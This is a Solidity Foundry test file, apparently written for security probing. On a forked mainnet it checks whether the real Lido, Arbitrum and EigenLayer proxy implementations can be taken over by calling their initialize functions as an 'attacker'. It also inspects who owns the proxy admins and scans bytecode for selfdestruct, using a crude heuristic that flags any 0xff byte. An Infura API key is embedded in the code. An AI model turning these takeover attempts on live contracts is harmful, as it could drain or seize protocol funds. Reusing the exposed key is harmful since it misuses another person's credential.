// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

contract UninitProxyExploit is Test {
    // Lido Withdrawal Queue Implementation
    address constant LIDO_IMPL = 0xE42C659Dc09109566720EA8b2De186c2Be7D94D9;
    address constant LIDO_PROXY = 0x889edC2eDab5f40e902b864aD4d7AdE8E412F9B1;

    // Arbitrum Bridge Implementation
    address constant ARB_IMPL = 0x93e8f92327bFa8096F5F6ee5f2a49183D3B3b898;
    address constant ARB_PROXY = 0x8315177aB297bA92A06054cE80a67Ed4DBd7ed3a;

    // EigenLayer StrategyManager Implementation
    address constant EIGEN_IMPL = 0x46aefd30415be99e20169eE7046F65784B46d123;
    address constant EIGEN_PROXY = 0x858646372CC42E1A627fcE94aa7A7033e7CF075A;

    function setUp() public {
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");
    }

    function testLidoImplementationInitialization() public {
        console.log("=====================================================");
        console.log("LIDO IMPLEMENTATION INITIALIZATION CHECK");
        console.log("=====================================================");

        console.log("Implementation:", LIDO_IMPL);

        // Check storage for initialized state
        bytes32 slot0 = vm.load(LIDO_IMPL, bytes32(0));
        console.log("Slot 0:", uint256(slot0));

        // OpenZeppelin Initializable uses specific slots for different versions
        // V4+ uses a specific slot
        bytes32 initSlot = keccak256("openzeppelin.storage.Initializable");
        bytes32 initData = vm.load(LIDO_IMPL, initSlot);
        console.log("OZ Initializable slot data:", uint256(initData));

        // Try calling initialize with various signatures
        address attacker = makeAddr("attacker");
        vm.startPrank(attacker);

        console.log("\n--- Attempting initialization calls ---");

        // Lido withdrawal queue initialize signature
        try this.callInitialize(LIDO_IMPL, abi.encodeWithSignature("initialize(address)", attacker)) {
            console.log("*** initialize(address) SUCCEEDED ***");
        } catch {
            console.log("initialize(address) reverted");
        }

        // Check if there's a resume function (Lido specific)
        try this.callStatic(LIDO_IMPL, abi.encodeWithSignature("getResumeSinceTimestamp()")) returns (bytes memory data) {
            console.log("Has resume function, data:", uint256(bytes32(data)));
        } catch {}

        vm.stopPrank();
    }

    function testArbitrumImplementation() public {
        console.log("=====================================================");
        console.log("ARBITRUM BRIDGE IMPLEMENTATION CHECK");
        console.log("=====================================================");

        console.log("Implementation:", ARB_IMPL);

        // Check storage
        bytes32 slot0 = vm.load(ARB_IMPL, bytes32(0));
        console.log("Slot 0:", uint256(slot0));

        // Arbitrum contracts may use custom init patterns
        address attacker = makeAddr("attacker");
        vm.startPrank(attacker);

        console.log("\n--- Attempting initialization ---");

        // Common Arbitrum initialize signatures
        try this.callInitialize(ARB_IMPL, abi.encodeWithSignature("initialize(address,address)", attacker, attacker)) {
            console.log("*** initialize(address,address) SUCCEEDED ***");
        } catch {
            console.log("initialize(address,address) reverted");
        }

        try this.callInitialize(ARB_IMPL, abi.encodeWithSignature("postUpgradeInit()")) {
            console.log("*** postUpgradeInit() SUCCEEDED ***");
        } catch {
            console.log("postUpgradeInit() reverted");
        }

        vm.stopPrank();
    }

    function testEigenLayerImplementation() public {
        console.log("=====================================================");
        console.log("EIGENLAYER IMPLEMENTATION CHECK");
        console.log("=====================================================");

        console.log("Implementation:", EIGEN_IMPL);

        // Check storage - slot 0 showed 0xff which could be initialized marker
        bytes32 slot0 = vm.load(EIGEN_IMPL, bytes32(0));
        console.log("Slot 0:", uint256(slot0));

        // 0xff typically means fully initialized in OZ Initializable v4+
        if (uint8(uint256(slot0)) == 255) {
            console.log("Slot 0 = 255 (0xff) - LIKELY INITIALIZED (OZ v4+ pattern)");
        }

        address attacker = makeAddr("attacker");
        vm.startPrank(attacker);

        console.log("\n--- Attempting initialization ---");

        // EigenLayer specific init
        try this.callInitialize(EIGEN_IMPL, abi.encodeWithSignature("initialize(address,address)", attacker, attacker)) {
            console.log("*** initialize(address,address) SUCCEEDED ***");
        } catch {
            console.log("initialize(address,address) reverted");
        }

        vm.stopPrank();
    }

    function testProxyAdminCapture() public {
        console.log("=====================================================");
        console.log("PROXY ADMIN CAPTURE CHECK");
        console.log("=====================================================");

        // Proxy admins
        address lidoAdmin = 0x3e40D73EB977Dc6a537aF587D48316feE66E9C8c;
        address arbAdmin = 0x554723262467F125Ac9e1cDFa9Ce15cc53822dbD;
        address eigenAdmin = 0x8b9566AdA63B64d1E1dcF1418b43fd1433b72444;

        console.log("Lido Proxy Admin:", lidoAdmin);
        checkProxyAdminVulnerability(lidoAdmin);

        console.log("\nArbitrum Proxy Admin:", arbAdmin);
        checkProxyAdminVulnerability(arbAdmin);

        console.log("\nEigenLayer Proxy Admin:", eigenAdmin);
        checkProxyAdminVulnerability(eigenAdmin);
    }

    function checkProxyAdminVulnerability(address admin) internal view {
        if (admin.code.length == 0) {
            console.log("*** ADMIN IS EOA ***");
            return;
        }

        // Check if it's a ProxyAdmin contract
        (bool success, bytes memory data) = admin.staticcall(
            abi.encodeWithSignature("owner()")
        );
        if (success && data.length >= 32) {
            address owner = abi.decode(data, (address));
            console.log("ProxyAdmin owner:", owner);

            // Check if owner is a multisig or timelock
            if (owner.code.length > 0) {
                console.log("Owner is a contract");

                // Try to get threshold for Gnosis Safe
                (bool safeSuccess, bytes memory safeData) = owner.staticcall(
                    abi.encodeWithSignature("getThreshold()")
                );
                if (safeSuccess && safeData.length >= 32) {
                    console.log("Gnosis Safe threshold:", abi.decode(safeData, (uint256)));
                }

                // Check for timelock
                (bool tlSuccess, bytes memory tlData) = owner.staticcall(
                    abi.encodeWithSignature("delay()")
                );
                if (tlSuccess && tlData.length >= 32) {
                    console.log("Timelock delay:", abi.decode(tlData, (uint256)));
                }
            }
        }
    }

    // Helper to make external calls (for try/catch)
    function callInitialize(address target, bytes memory data) external {
        (bool success,) = target.call(data);
        require(success, "Call failed");
    }

    function callStatic(address target, bytes memory data) external view returns (bytes memory) {
        (bool success, bytes memory result) = target.staticcall(data);
        require(success, "Call failed");
        return result;
    }

    function testSelfDestructVulnerability() public {
        console.log("=====================================================");
        console.log("SELFDESTRUCT VULNERABILITY CHECK");
        console.log("=====================================================");

        // If an implementation can selfdestruct, proxy becomes bricked

        address[3] memory implementations = [LIDO_IMPL, ARB_IMPL, EIGEN_IMPL];

        for (uint i = 0; i < implementations.length; i++) {
            console.log("\n--- Checking:", implementations[i], "---");

            // Check if contract has selfdestruct opcode in bytecode
            bytes memory code = implementations[i].code;
            bool hasSelfDestruct = checkForSelfDestruct(code);

            if (hasSelfDestruct) {
                console.log("*** CONTRACT MAY HAVE SELFDESTRUCT ***");
            } else {
                console.log("No obvious selfdestruct found");
            }
        }
    }

    function checkForSelfDestruct(bytes memory code) internal pure returns (bool) {
        // SELFDESTRUCT opcode = 0xff
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xff) {
                // Check if it's likely a SELFDESTRUCT (not just data)
                // This is heuristic - in real audit would need deeper analysis
                return true;
            }
        }
        return false;
    }
}
